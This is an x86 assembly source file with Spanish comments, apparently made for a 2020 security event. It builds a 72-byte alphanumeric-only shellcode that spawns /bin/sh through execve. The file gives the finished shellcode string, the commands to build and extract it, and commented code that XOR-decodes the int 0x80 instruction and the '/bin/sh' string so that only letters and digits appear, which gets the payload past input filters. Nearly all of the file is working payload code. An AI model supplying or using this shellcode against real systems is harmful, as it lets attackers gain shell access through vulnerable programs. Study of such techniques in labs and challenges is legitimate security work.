; Shellcode: fhz0YAAAAAA0HF0hG0HGhu12ZX5ZBZZPhu834X5ZZZZPTYh9000X52000P4249PPQTUVWaM0
; Longitud:  72 bytes
;
; En este codigo, solo se usaran los siguientes caracteres: a-z A-Z 0-9
; Para 0-9: \x30-\x39
; Para A-Z: \x41-\x5a
; Para a-z: \x61-\x7a
;
; Comando de compilacion:
; nasm -f elf bitup2020.asm; ld -m elf_i386 -s -o bitup2020 bitup2020.o; objdump -d ./bitup2020|grep '[0-9a-f]:'|grep -v 'file'|cut -f2 -d:|cut -f1-6 -d' '|tr -s ' '|tr '\t' ' '|sed 's/ $//g'|sed 's/ /\\x/g'|paste -d '' -s |sed 's/^/"/'|sed 's/$/"/g'
;
; (PROMO) Ha sido mucho mas facil crear este shellcode gracias a: https://defuse.ca/online-x86-assembler.htm
; (GUIAS) Donde aprender como realizar Shellcode alfanumerico: http://phrack.org/issues/57/15.html




; Usamos ecx para descifrar int 0x80 cifrado con XOR.
; Aqui eax tiene guardada la direccion de la primera instruccion del shellcode.
; El int 0x80 ocupa dos bytes y esta alojado en el penultimo y ultimo byte
; Introducimos 0x7A en ECX y un segundo byte imprimible (0x30)
push word 0x307a          ; 66 68 7a 7a = f h z z        
pop  ecx                  ; 59 = Y
; Lo incrementamos 6 veces hasta llegar a 0x80
inc ecx                   ; 41 = A
inc ecx                   ; 41 = A
inc ecx                   ; 41 = A
inc ecx                   ; 41 = A
inc ecx                   ; 41 = A
inc ecx                   ; 41 = A
; Valor actual de ECX = 0x????307A
; 11 bytes usados en este bloque de codigo




;   DESCIFRAMOS PRIMER BYTE DEL INT 0x80 (Guardado como 0x4d, tiene que acabar valiendo 0xcd) 
; Desciframos ese primer byte: 0x4d ^ 0x80 = 0xcd
xor BYTE [eax + 0x46], cl ; 30 48 46 = 0 H F
;   DESCIFRAMOS SEGUNDO BYTE DEL INT 0x80 (Guardado como 0x30, tiene que acabar valiendo 0x80)
; Primero le realizamos xor con el registro ecx (En concreto ch, que todavia vale 0x30): 0x30 ^ 0x30 = 0x00
xor BYTE [eax + 0x47], ch ; 30 68 47 = 0 h G
; Usamos xor para guardar el byte del registro ecx (En concreto cl, que vale 80): 0x00 ^ 0x80 = 0x80
xor BYTE [eax + 0x47], cl ; 30 48 47 = 0 H G
; 9 bytes usados en este bloque de codigo



; Guardar string "/bin/sh\0" en el stack
; Como no se pueden meter en el shellcode ni el caracter '/' ni el Null Byte,
; se introducira una String cifrada y se descifrara con XOR
;    Primer DWORD de la String
; 'Z21u' ^ 'ZZBZ' = '\0hs/'
; - descifrado: 0x5a323175 ^ 0x5a5a425a
push 0x5a323175      ; 68 75 31 32 5a = h u 1 2 Z
pop  eax             ; 58             = X
xor  eax, 0x5a5a425a ; 35 5a 42 5a 5a = 5 Z B Z Z
push eax             ; 50             = P
;    Segundo  DWORD de la String
; '438u' ^ 'ZZZZ' = 'nib/'
; - descifrado: 0x34333875 ^ 0x5a5a5a5a
push 0x34333875      ; 68 75 38 33 34 = h u 8 3 4
pop  eax             ; 58             = X
xor  eax, 0x5a5a5a5a ; 35 5a 5a 5a 5a = 5 Z Z Z Z
push eax             ; 50             = P
; 24 bytes usados en este bloque de codigo



; Hacer que ECX apunte al inicio de la String ('/bin/sh\0').
; Luego le daremos este valor a EBX y ECX valdra 0x00000000
push esp ; 54 = T
pop  ecx ; 59 = Y
; 2 bytes usados en este bloque de codigo




; Dar a EAX el valor 11
push 0x30303039      ; 68 39 30 30 30 = h 9 0 0 0
pop  eax             ; 58             = X
xor  eax, 0x30303032 ; 35 32 30 30 30 = 5 2 0 0 0
; 11 bytes usados en este bloque de codigo




; Hacer que:
; - EDX valga 0x0
; - EBX valga lo mismo que ECX (direccion de memoria de "/bin/sh\0")
; - ECX valga 0x0
push eax ; 50 = P ; EAX no cambia
; Cambiamos el valor de EAX de 0xb a 0x0, para darle este valor a EDX y a ECX
xor  al, 0x32 ; 34 32 = 5 2
xor  al, 0x39 ; 34 39 = 5 9
; Seguimos guardando el resto del valores para el popad
push eax ; 50 = P ; ECX = EAX nuevo (EAX = 0x0)
push eax ; 50 = P ; EDX = EAX nuevo (EAX = 0x0)
push ecx ; 51 = Q ; EBX = ECX (Direccion de memoria de la String '/bin/sh\0')
push esp ; 54 = T ; ESP no cambia (En realidad ESP siempre se ignora en popad, por eso no cambia)
push ebp ; 55 = U ; EBP no cambia
push esi ; 56 = V ; ESI no cambia
push edi ; 57 = W ; EDI no cambia
popad    ; 61 = a ; Se guardan todos esos registros (Ignorando ESP)
; 13 bytes usados en este bloque de codigo


; Se ejecuta execve con el "int 0x80"
dw 0x304d ; 4d 30 = M 0 ; Cuando se descifre, resulta en la instruccion: int 0x80  ->  cd 80 (Bytes no imprimibles)
; 2 bytes usados en este bloque de codigo